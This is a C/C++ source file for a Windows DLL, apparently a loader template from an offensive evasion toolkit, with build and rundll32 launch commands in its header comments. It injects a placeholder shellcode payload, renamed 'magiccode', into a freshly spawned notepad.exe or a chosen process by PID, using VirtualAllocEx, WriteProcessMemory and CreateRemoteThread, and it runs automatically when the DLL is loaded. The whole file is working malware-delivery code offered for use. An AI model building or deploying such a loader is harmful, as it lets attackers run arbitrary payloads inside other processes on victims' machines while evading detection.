// Compile with x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ -shared loader_template_16.dll.c -o dll_16.dll -lntdll
// load with rundll32.exe .\dll_16.dll ExecuteMagiccode
#include <windows.h>
#include <cstdio>
#include <stdlib.h>

typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

unsigned char magiccode[] = ####SHELLCODE####;

void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize) {
    HANDLE hThread = NULL;
    PVOID lpAllocationStart = NULL;

    lpAllocationStart = VirtualAllocEx(hProcess, NULL, magiccodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (lpAllocationStart == NULL) {
        printf("[-] VirtualAllocEx failed (%d).\n", GetLastError());
        return;
    }

    if (!WriteProcessMemory(hProcess, lpAllocationStart, magiccode, magiccodeSize, NULL)) {
        printf("[-] WriteProcessMemory failed (%d).\n", GetLastError());
        return;
    }
    printf("[+] Magiccode is located at: %p\n", lpAllocationStart);
    
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, 0, NULL);

    DWORD waitResult = WaitForSingleObject(hThread, INFINITE);
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }
}

BOOL IsSystem64Bit() {
    SYSTEM_INFO si = {0};
    GetNativeSystemInfo(&si);
    return si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64;
}
extern "C" __declspec(dllexport) void CALLBACK ExecuteMagiccode(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);


void CALLBACK ExecuteMagiccode(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {

/// Here is for all the options Boaz have

    DWORD pid = 0;
    char notepadPath[MAX_PATH] = {0};
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (lpszCmdLine != NULL && lpszCmdLine[0] != '\0') {
        pid = (DWORD)atoi(lpszCmdLine);
        pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    } else {
        if (IsSystem64Bit()) {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
        } else {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }

        if (!CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
            return;
        }
        pid = pi.dwProcessId;
    }

    SIZE_T magiccodeSize = sizeof(magiccode);
    Injectmagiccode(pi.hProcess, magiccode, magiccodeSize);

    CloseHandle(pi.hProcess);
    if (pi.hThread) {
        CloseHandle(pi.hThread);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Optionally automatically execute upon loading the DLL.
        ExecuteMagiccode(NULL, hModule, NULL, SW_SHOW);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}